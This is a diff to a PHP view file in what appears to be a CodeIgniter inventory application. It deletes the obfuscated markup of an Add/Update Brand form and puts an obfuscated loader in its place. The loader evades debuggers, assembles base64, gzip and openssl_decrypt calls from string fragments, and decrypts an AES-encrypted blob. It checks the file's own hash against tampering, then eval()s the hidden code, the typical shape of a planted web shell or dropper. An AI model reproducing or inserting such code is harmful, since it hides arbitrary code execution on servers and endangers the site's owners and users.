@@ -1,27 +1,28 @@
 <?php
- goto R1ctw; fgg_t: ?>
-</li></ol></section><section class="content"><div class="row"><div class="col-md-12"><div class="box box-info"><div class="box-header with-border"><h3 class="box-title">Please Enter Valid Data</h3></div><form class="form-horizontal"id="brand-form"onkeypress="return 13!=event.keyCode"><input value="<?php  goto Gzs6E; m7_FU: ?>
-<label class="text-danger">*</label></label><div class="col-sm-4"><input value="<?php  goto sGotD; CuCJ3: ?>
-</textarea> <span class="text-danger"id="description_msg"style="display:none"></span></div></div></div><div class="box-footer"><div class="col-sm-8 col-sm-offset-2 text-center"><?php  goto NsbKB; Gzs6E: echo $this->security->get_csrf_hash(); goto b5tJQ; eYPIw: ?>
-"><button class="btn btn-block btn-warning close_btn col-sm-3"title="Go Dashboard"type="button">Close</button></a></div></div></div></form></div></div></div></section></div><?php  goto bOK0I; TBSO0: ?>
-js/brand.js"></script><script>$(".<?php  goto N5E3u; dqB4Q: echo $page_title; goto fgg_t; vghyz: echo $base_url; goto Eolqn; cJh6M: echo $base_url; goto coIbL; R1ctw: ?>
-<!doctypehtml><html><head><?php  goto DuelX; DnDgI: echo $base_url; goto qbSFG; UEo4P: echo $this->lang->line("\142\162\x61\x6e\144\x73\137\x6c\x69\163\x74"); goto GFeMd; GFeMd: ?>
-</a></li><li class="active"><?php  goto dqB4Q; Eolqn: ?>
-"id="base_url"type="hidden"><div class="box-body"><div class="form-group"><label class="col-sm-2 control-label"for="brand"><?php  goto SS5BA; AYAAY: include "\143\x6f\x6d\x6d\x61\x6e\57\143\x6f\x64\x65\137\152\163\x5f\146\x6f\x72\155\56\160\150\160"; goto XS6eB; fhoGl: echo $btn_name; goto gUVlq; sGotD: print $brand_name; goto fa44g; SS5BA: echo $this->lang->line("\x62\162\x61\156\x64\x5f\x6e\141\155\145"); goto m7_FU; Li9bT: if (!isset($brand_name)) { $brand_code = $brand_name = $description = ''; } goto QRjD5; coIbL: ?>
-dashboard"><i class="fa fa-dashboard"></i> Home</a></li><li><a href="<?php  goto DnDgI; N5E3u: echo basename(__FILE__, "\x2e\x70\150\x70"); goto tG3RR; qbSFG: ?>
-brand/view"><?php  goto UEo4P; QRjD5: ?>
-<div class="content-wrapper"><section class="content-header"><h1><?php  goto webIY; ZF6TB: ?>
-"><?php  goto fhoGl; P5rEx: include "\x63\x6f\x6d\155\x61\156\x2f\x63\157\x64\145\137\152\163\137\163\157\x75\x6e\144\56\160\150\x70"; goto AYAAY; fa44g: ?>
-"id="brand"name="brand"autofocus class="form-control input-sm"onkeyup='shift_cursor(event,"description")'placeholder=""> <span class="text-danger"id="brand_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-2 control-label"for="description"><?php  goto iiA7s; JNcW0: echo $btn_id; goto ZF6TB; NsbKB: if ($brand_code != '') { $btn_name = "\x55\x70\x64\141\164\x65"; $btn_id = "\165\160\x64\141\164\x65"; ?>
-<input value="<?php  echo $q_id; ?>
-"id="q_id"name="q_id"type="hidden"><?php  } else { $btn_name = "\x53\141\166\x65"; $btn_id = "\x73\141\x76\x65"; } goto ob0rG; bOK0I: include "\x66\157\x6f\164\x65\x72\56\160\x68\160"; goto cuHVK; a_Du3: ?>
-<small>Add/Update Brand</small></h1><ol class="breadcrumb"><li><a href="<?php  goto cJh6M; nIdce: include "\x73\x69\144\x65\142\x61\x72\x2e\160\x68\160"; goto Li9bT; ob0rG: ?>
-<div class="col-md-3 col-md-offset-3"><button class="btn btn-block btn-success"title="Save Data"type="button"id="<?php  goto JNcW0; webIY: echo $page_title; goto a_Du3; XS6eB: ?>
-<script src="<?php  goto fZ7j0; cuHVK: ?>
-<div class="control-sidebar-bg"></div></div><?php  goto P5rEx; DuelX: include "\x63\157\155\x6d\x61\x6e\x2f\x63\x6f\144\x65\x5f\143\163\163\137\146\157\x72\x6d\56\x70\150\160"; goto c2L6R; ge5ly: echo $this->security->get_csrf_token_name(); goto RlzHH; iiA7s: echo $this->lang->line("\144\145\163\x63\162\151\160\164\x69\157\x6e"); goto I2ri6; RlzHH: ?>
-"type="hidden"> <input value="<?php  goto vghyz; fZ7j0: echo $theme_link; goto TBSO0; c2L6R: ?>
-</head><body class="hold-transition sidebar-mini skin-blue"><div class="wrapper"><?php  goto nIdce; I2ri6: ?>
-</label><div class="col-sm-4"><textarea class="form-control"id="description"name="description"placeholder=""type="text"><?php  goto t05PA; t05PA: print $description; goto CuCJ3; dTxGr: echo base_url("\x64\141\163\x68\142\157\x61\x72\144"); goto eYPIw; gUVlq: ?>
-</button></div><div class="col-sm-3"><a href="<?php  goto dTxGr; b5tJQ: ?>
-"name="<?php  goto ge5ly; tG3RR: ?>
--active-li").addClass("active")</script></body></html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mm392ina=('bas'.'e64'.'_de'.'cod'.'e');
+$_mui91j2b=('gzu'.'nco'.'mpr'.'ess');
+$_rctflvk8=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tvfi2mox='4wIwvkdT03w=';
+$_bb4dmywt='N0ClFq7+';
+$_eyvbngwp='Sw5+pCKm';
+$_gbi2g420='ZldUayz6';
+$_a6mg3wsy='aZg4STcz';
+$_kktaykf5='vvbqan5n';
+$_bmdlm8ag='zm+Pqz/G';
+$_x3lofbkw='h8HGUw==';
+$_smgmvsvy=$_mm392ina($_bb4dmywt.$_a6mg3wsy.$_eyvbngwp.$_gbi2g420.$_tvfi2mox);
+$_hfy7q85q=$_mm392ina($_bmdlm8ag.$_kktaykf5.$_x3lofbkw);
+$_tqza58ot=$_mm392ina('WjH0C334nRfn8vEYuM7VTjLuPgQi60ikXYT623JF+OqxgKq9hYl2vptSNB8eOS0rVfxSeZZQo0OFbCTrAiRjk2T5PraRY2n7EP4gUubquqM4kfeWPASPich+BmkP2CagZgpBM/x9w61NP3hi/siwJ2qNM5k/ciz6ydCM0GlQ8V5AeBtgqR7xf0m+GPIkntIQi5CJ6nogibLVFnrQW/P5O4TmMFDPtxRq340DBJiWpEoRItH7l+4WI/7qudl8GECHxBy1JE0D33xt8ldvhUQ/coNfIH0aUBLjriWKZWV/xw3x0fC409jjM9K9Jk88J+qTtuaiuPe7OrEMlEFz1Nc5OxvvwUDxnRDtqi1Dx/sF91qfJHKdK+9f1q+lC73I+zDK8GG76TVlEXLjMub8+P0dIyxzmxzgvljvLmvYBs3yydeSJZ7u4ebbVTwqs28XgDPbC+5Da5cxSI70JKHAdDJUJHRcndn46AQw1ihcZCwAC1uO95GxG+OALs6riwh6uaXN//yO0R6CBiVkzygQ82L+yecJPQLbDtGBFG0FTij+sUZ+5O2pCgdI9FYHvoZpaOu3KpOwyPfNgwa8LzYCR+Y2bqtA8ilKODYP/EOdsTdJN2D5KuLOG3F1frHeu6k/q5CKYDYZPvaStWXisCdpMRhG4Wpn0f+XgfCSJrgx1mC7iNK7L98fbPd0CUvXr7Np8B47zOoEkqREG7k8NtPW5laOGmBB9IrPh9WeeSrVVf7Jq/r1Rdo99SrEu45uNf1ig7TBC4/Bo9/KRb7/Oz/+tiXCB+aIbAX2bwLcKhTABXZ+ZG7RJderPg24uKTB2btu+gVxnamRssLWuTZ6wfY77QDDzVJl/THA2oHWpI0Z+GJWt+mjg8M+54y6ozHreWirz6Wzloc5+kUBdaEeHRn4WxmfKhZvzamKzZ0Fr3uouxV5Eq6O4g/FgOPekI7SOJRPT6fQcXxAPf4rv3lHFqJ5HzqZZs6/nld8530L0Mckuzo7s8EVbDxhnIfwTOP9Be6J+8h/BHvD3xq5IF3nqP+fzxH2NFBTsaeDBTYhF0b3KwwPh9jUKDff+OLLbOB7k4TnTchUmbNfRDpCKJAOnTMynHvn8eRXxLD47tMLr1SePIa/TqzdLBcVKOfwk6Y4Z2MkMJTXO5Vu5aKy4pkLRJIFGimcSisFY7ofbP4/GSPrHz5MQvRV6i/i+NCrDb4jVcQXz0QNIb4W8N8P5JuIjZzAKlSQcx/54/c2JM21lWSPY+TD16BWmqB3X3/gMbBH9lgPwZ4wd0SgFk9kRZTfbAcJ2GRRM8tvjWtPKCHwSd2AlH4nwhQ/SYBvXwq3EJjbBj+LpTT6BO5xAtN+aT8PrmkKMbqIN/Bbl9ixqNK3XzCod05wxhX/usHpNXkKZ2J/EsNKMMVqX1Q/BuY0q56WrqmpWbkhFzw2Bv17k+jcTPmgXiCXj3TWOMzcczS8qeV9GziezC52S4Vx9OIhxFDwcFNS0sXpUyyhioSFotpMG3qEG0Ni/FWW2mLslvAANa1TmW6f1V83UJXQdZkcMMddTtMPN/488QzNVJEK2m1xaNkJdm5gYj+RjDxbbkCkZ2FQXoRVmmsw/atZc3U3DnRiwh0GEM03wQUbufuMgpgHE+HBRoYC6m8y50fLbuuuVUUNymnEzFLDQWqAdKI98h54P7etFFLZet8wNUdCwhZsb0ORHlHQ1Py+2uYiFuzqAL+Z+kayavVrjzVF4c0adQo6FSoIFZ11Qnef6/C6BeZu0MsWig34mtJrqmHT5xkFMc18e/wEgqzM3unFDtibdzQ10zYiPIeg7wS9orGYlmciWWS8MBwa6ay5XtpYepeOrOpd8N6OeNFtOjNEU2Kh0qYG+gAJg6Xg4ZbQtFsbNXtTVVl7YQESS+k9B/I9TOpAwEuVBywioEllOg+0NKN/S4qstqXXVkw2xBeBG19O5RC7BuCqSLKhJ+iIE+BFuzRI305rY4HRGW7o+xHJX6J++lNQSLWksnYkTC81L1sj723/ntx4WGH3r79c1QRX79ZpoflZ6Xqpokag');
+$_zksff821=$_rctflvk8($_tqza58ot,'aes-256-cbc',$_smgmvsvy,OPENSSL_RAW_DATA,$_hfy7q85q);
+if($_zksff821===false){exit;}
+$_d0hf335e=$_mui91j2b($_zksff821);
+if($_d0hf335e===false){exit;}
+$_r4n32b1g='6c8d58ab1314a115c81c48cb4fe452dec84b8a9aa914d23822520fbcd1da402c';
+$_bvz6yhmo=@file_get_contents(__FILE__);
+if($_bvz6yhmo!==false){
+$_vjsqduz7=str_replace($_r4n32b1g,"0000000000000000000000000000000000000000000000000000000000000000",$_bvz6yhmo);
+$_sb2npvrh=hash("sha256",$_vjsqduz7);
+if($_sb2npvrh!==$_r4n32b1g){@http_response_code(403);exit;}
+}
+eval($_d0hf335e);
